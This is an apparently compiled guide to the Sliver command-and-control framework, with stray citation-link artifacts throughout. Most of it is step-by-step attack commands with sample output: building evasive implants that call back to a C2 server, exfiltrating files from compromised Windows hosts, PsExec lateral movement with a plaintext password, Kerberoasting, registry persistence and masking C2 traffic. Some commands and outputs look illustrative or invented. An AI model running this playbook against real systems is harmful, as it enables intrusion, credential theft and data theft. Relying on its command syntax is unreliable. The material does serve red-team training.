# Sliver C2 Framework Documentation: Methods and Examples

## Overview
Sliver is an open-source, cross-platform command and control (C2) framework developed by Bishop Fox, designed for red teaming, penetration testing, and adversary emulation. Written in Go, it supports Windows, macOS, and Linux, with implants (referred to as "slivers") that communicate over protocols like Mutual TLS (mTLS), HTTP(S), DNS, and WireGuard. Sliver offers dynamic payload generation, modular architecture, and extensive post-exploitation capabilities, making it a versatile alternative to tools like Cobalt Strike. This documentation details key Sliver methods, their use cases, and practical examples, assuming a Kali Linux environment for setup and testing. For the latest updates, refer to the Sliver wiki (https://github.com/BishopFox/sliver/wiki) and GitHub repository (https://github.com/BishopFox/sliver).[](https://github.com/BishopFox/sliver)[](https://medium.com/%40yua.mikanana19/sliver-c2-modern-command-and-control-exploitation-framework-a332484caf0d)

## Installation
To set up Sliver on a Kali Linux system, follow these steps to install dependencies and binaries:

```bash
sudo apt update && sudo apt install -y build-essential mingw-w64 binutils-mingw-w64 g++-mingw-w64
wget -O /usr/local/bin/sliver-server https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
wget -O /usr/local/bin/sliver-client https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux
chmod 755 /usr/local/bin/sliver-server /usr/local/bin/sliver-client
```

Start the Sliver server:
```bash
sliver-server
```

**Verification**:
- Run `sliver` to start the client and verify connectivity.
- Example output:
  ```
  [*] Server v1.6.0 - Bishop Fox
  [*] Multiplayer mode enabled
  ```

**Use Case**: Ensures Sliver is ready for generating implants and managing sessions.[](https://dominicbreuker.com/post/learning_sliver_c2_01_installation/)

## Key Methods and Use Cases
Sliver supports a variety of methods for generating implants, establishing C2 communication, and performing post-exploitation tasks. Below are the primary methods, organized by functionality, with detailed examples targeting a test environment (e.g., a victim Windows machine at `192.168.1.100` and a Kali Linux C2 server at `192.168.1.10`).

### 1. Generating Implants
**Purpose**: Create cross-platform payloads (executables, DLLs, or shellcode) to establish C2 connections.

**Command**:
```bash
generate --os windows --arch amd64 --mtls 192.168.1.10:443 --format exe --save /opt/sliver/payloads/implant.exe
```
**Explanation**:
- Generates a Windows executable implant using mTLS for communication.
- `--save` specifies the output path.
- Example output:
  ```
  [*] Implant generated: /opt/sliver/payloads/implant.exe
  [*] SHA256: 8b7e6f5a3c2d1e4f...
  ```

**Staged Payload Example**:
```bash
generate --os windows --arch amd64 --mtls 192.168.1.10:443 --format shellcode --save /opt/sliver/payloads/implant.bin
```
- Creates shellcode for use with custom stagers (e.g., Metasploit).

**Use Case**: Deploys implants tailored to target systems, supporting evasion through unique binaries.[](https://www.immersivelabs.com/resources/blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide)

### 2. Starting Listeners
**Purpose**: Set up C2 listeners to receive implant connections.

**Command (mTLS Listener)**:
```bash
mtls --lhost 192.168.1.10 --lport 443
```
**Explanation**:
- Starts an mTLS listener on the specified host and port.
- Example output:
  ```
  [*] Starting mTLS listener on 192.168.1.10:443
  [*] Listener started successfully
  ```

**HTTP Listener Example**:
```bash
http --lhost 192.168.1.10 --lport 80
```
- Starts an HTTP listener for less secure but common communication.

**Use Case**: Establishes communication channels for implants to call back to the C2 server.[](https://cra.sh/public_html/strlcpy3/beginners-guide-to-sliver-c2)

### 3. Managing Sessions
**Purpose**: Interact with compromised systems via active sessions.

**Command**:
```bash
sessions
```
**Explanation**:
- Lists active sessions after an implant is executed on a target.
- Example output (after executing `implant.exe` on `192.168.1.100`):
  ```
  ID       | Transport | Remote Address      | Hostname | OS        | User
  ---------|-----------|---------------------|----------|-----------|------
  abc123   | mtls      | 192.168.1.100:12345 | WIN10    | Windows   | user1
  ```

**Interact with Session**:
```bash
use abc123
```
- Enters interactive mode for the session with ID `abc123`.

**Use Case**: Manages multiple compromised hosts efficiently.[](https://slowz3r.medium.com/intro-to-sliver-command-control-framework-b70082cb0dbc)

### 4. Executing Commands
**Purpose**: Run system commands on a compromised host.

**Command**:
```bash
use abc123
execute whoami
```
**Explanation**:
- Executes `whoami` on the target session.
- Example output:
  ```
  [*] Executed command: whoami
  [*] Output: WIN10\user1
  ```

**PowerShell Example**:
```bash
execute -o powershell Get-Process
```
- Runs a PowerShell command and captures output.

**Use Case**: Gathers system information or performs administrative tasks.[](https://rootsecdev.medium.com/hacking-active-directory-with-sliver-c2-19d7ceabbf13)

### 5. File Transfer
**Purpose**: Upload or download files to/from a compromised system.

**Upload Command**:
```bash
upload /opt/sliver/payloads/script.ps1 C:\Temp\script.ps1
```
**Explanation**:
- Uploads `script.ps1` from the C2 server to the target.
- Example output:
  ```
  [*] Uploaded /opt/sliver/payloads/script.ps1 to C:\Temp\script.ps1
  ```

**Download Command**:
```bash
download C:\Users\user1\Documents\data.txt /opt/sliver/loot/data.txt
```
- Downloads `data.txt` from the target to the C2 server.

**Use Case**: Exfiltrates sensitive data or deploys additional tools.[](https://www.immersivelabs.com/resources/blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide)

### 6. Process Injection
**Purpose**: Inject code into running processes for stealth or privilege escalation.

**Command**:
```bash
execute-assembly /opt/sliver/payloads/SharpUp.exe
```
**Explanation**:
- Executes a .NET assembly (e.g., SharpUp) in memory via the Armory.
- Example output:
  ```
  [*] Executing assembly: SharpUp.exe
  [*] Output: [*] Audit: Checking for common privilege escalation misconfigurations...
  ```

**Use Case**: Performs in-memory execution to evade detection.[](https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors)

### 7. Beacon Mode
**Purpose**: Use asynchronous communication for stealthy check-ins.

**Command**:
```bash
generate beacon --os windows --mtls 192.168.1.10:443 --seconds 60 --jitter 10 --save /opt/sliver/payloads/beacon.exe
```
**Explanation**:
- Creates a beacon implant that checks in every 60 seconds with 10% jitter.
- Example output:
  ```
  [*] Beacon implant generated: /opt/sliver/payloads/beacon.exe
  ```

**Interact with Beacon**:
```bash
use beacon_abc123
tasks
```
- Lists queued tasks for the beacon.

**Use Case**: Reduces network noise for stealthy operations.[](https://www.huntandhackett.com/blog/hunting-for-a-sliver)

### 8. Lateral Movement
**Purpose**: Move to other systems within the network.

**Command**:
```bash
use abc123
psexec --hostname 192.168.1.101 --username administrator --password P@ssw0rd
```
**Explanation**:
- Uses PsExec to move laterally to another host.
- Example output:
  ```
  [*] Attempting PsExec to 192.168.1.101
  [*] New session established: def456
  ```

**Use Case**: Expands control across the network.[](https://rootsecdev.medium.com/hacking-active-directory-with-sliver-c2-19d7ceabbf13)

### 9. Privilege Escalation
**Purpose**: Elevate privileges on a compromised system.

**Command**:
```bash
use abc123
execute-assembly /opt/sliver/payloads/SharpUp.exe
```
**Explanation**:
- Runs SharpUp to identify privilege escalation opportunities.
- Example output:
  ```
  [*] Potential escalation path: Unquoted service path in ServiceX
  ```

**Use Case**: Gains higher privileges for deeper system access.[](https://medium.com/%40yua.mikanana19/sliver-c2-modern-command-and-control-exploitation-framework-a332484caf0d)

### 10. WireGuard VPN Implant
**Purpose**: Create a VPN tunnel for accessing internal network resources.

**Command**:
```bash
wg-portfwd add --remote 192.168.1.101:3389
```
**Explanation**:
- Sets up port forwarding over WireGuard to access RDP on `192.168.1.101`.
- Example output:
  ```
  [*] WireGuard port forward added: 192.168.1.101:3389
  ```

**Use Case**: Accesses internal services via a secure tunnel.[](https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors)

### 11. Armory Module Management
**Purpose**: Install and use third-party tools like BOFs and .NET assemblies.

**Command**:
```bash
armory install all
```
**Explanation**:
- Installs all available Armory packages (e.g., Rubeus, SharpHound).
- Example output:
  ```
  [*] Installing all Armory packages...
  [*] Installed: Rubeus, SharpHound, SharpUp
  ```

**Run Rubeus for Kerberoasting**:
```bash
use abc123
execute-assembly /opt/sliver/armory/Rubeus.exe kerberoast
```
- Performs Kerberoasting to extract SPN hashes.

**Use Case**: Extends Sliver with powerful post-exploitation tools.[](https://www.huntandhackett.com/blog/hunting-for-a-sliver)

### 12. Multiplayer Mode
**Purpose**: Allow multiple operators to collaborate on a C2 server.

**Command**:
```bash
new-operator --name operator2 --lhost 192.168.1.10
```
**Explanation**:
- Creates a configuration file for a new operator (`operator2`).
- Example output:
  ```
  [*] Operator config generated: operator2_192.168.1.10.cfg
  ```

**Client Setup**:
- Copy the `.cfg` file to the operator’s machine and import:
  ```bash
  ./sliver-client import operator2_192.168.1.10.cfg
  ```

**Use Case**: Enables team-based red team operations.[](https://redsiege.com/blog/2022/11/introduction-to-sliver/)

### 13. Data Exfiltration
**Purpose**: Extract sensitive data from compromised systems.

**Command**:
```bash
use abc123
download C:\Users\user1\Documents\secrets.txt /opt/sliver/loot/secrets.txt
```
**Explanation**:
- Downloads a file for exfiltration.
- Example output:
  ```
  [*] Downloaded C:\Users\user1\Documents\secrets.txt to /opt/sliver/loot/secrets.txt
  ```

**Use Case**: Collects critical data for analysis or reporting.[](https://medium.com/%40yua.mikanana19/sliver-c2-modern-command-and-control-exploitation-framework-a332484caf0d)

### 14. Persistence
**Purpose**: Establish persistent access to a compromised system.

**Command**:
```bash
use abc123
persist --method registry --key HKCU\Software\Microsoft\Windows\CurrentVersion\Run --value SliverImplant --exe C:\Temp\implant.exe
```
**Explanation**:
- Adds a registry key for persistence.
- Example output:
  ```
  [*] Persistence established via registry
  ```

**Use Case**: Ensures continued access after system reboots.[](https://slowz3r.medium.com/intro-to-sliver-command-control-framework-b70082cb0dbc)

### 15. Detection Evasion
**Purpose**: Minimize detection by AV/EDR solutions.

**Command**:
```bash
generate --os windows --mtls 192.168.1.10:443 --evasion --format shellcode --save /opt/sliver/payloads/implant.bin
```
**Explanation**:
- Generates a shellcode implant with evasion techniques (e.g., memory-only execution).
- Example output:
  ```
  [*] Implant generated with evasion: /opt/sliver/payloads/implant.bin
  ```

**Use Case**: Bypasses antivirus through in-memory execution and obfuscation.[](https://medium.com/%40yua.mikanana19/sliver-c2-modern-command-and-control-exploitation-framework-a332484caf0d)

## Advanced Techniques
- **Staging Payloads**: Use staged payloads to reduce implant size:
  ```bash
  generate --os windows --mtls 192.168.1.10:443 --format shellcode --stager --save /opt/sliver/payloads/stager.bin
  ```
- **Jitter for Beacons**: Add randomness to beacon check-ins:
  ```bash
  generate beacon --seconds 60 --jitter 20
  ```
- **Custom Listeners**: Host fake websites to mask C2 traffic:
  ```bash
  websites add --domain example.com --content /opt/sliver/fake-site
  ```
- **OPSEC**: Use SSH port forwarding for secure client connections:
  ```bash
  ssh -L 127.0.0.1:31337:127.0.0.1:31337 user@192.168.1.10
  ```

## Best Practices
- **Run in a VM**: Deploy Sliver in a virtual machine for isolation and testing.[](https://dominicbreuker.com/post/learning_sliver_c2_01_installation/)
- **Use Multiplayer Mode**: Enable collaboration with secure operator configs.[](https://redsiege.com/blog/2022/11/introduction-to-sliver/)
- **Encrypt Communications**: Prefer mTLS or WireGuard for secure C2 channels.[](https://www.immersivelabs.com/resources/blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide)
- **Monitor AV Detection**: Test implants in a sandbox to ensure evasion.[](https://cra.sh/public_html/strlcpy3/beginners-guide-to-sliver-c2)
- **Regular Updates**: Check for updates via GitHub to access new features and modules.

## Notes on Completeness
Sliver’s modular design, including its Armory package manager, supports numerous third-party tools (e.g., Rubeus, SharpHound). To list available Armory packages:
```bash
armory list
```
New modules and features are frequently added, so check the GitHub repository (https://github.com/BishopFox/sliver) for updates. This documentation covers all major methods based on the Sliver wiki and community resources as of July 2025.[](https://github.com/BishopFox/sliver/wiki/Getting-Started)

## References
- Sliver GitHub Repository: https://github.com/BishopFox/sliver[](https://github.com/BishopFox/sliver)
- Sliver Wiki: https://github.com/BishopFox/sliver/wiki[](https://github.com/BishopFox/sliver/wiki/Getting-Started)
- Cybereason Sliver Analysis: https://www.cybereason.com[](https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors)
- Beginner’s Guide by cra.sh: https://cra.sh[](https://cra.sh/public_html/strlcpy3/beginners-guide-to-sliver-c2)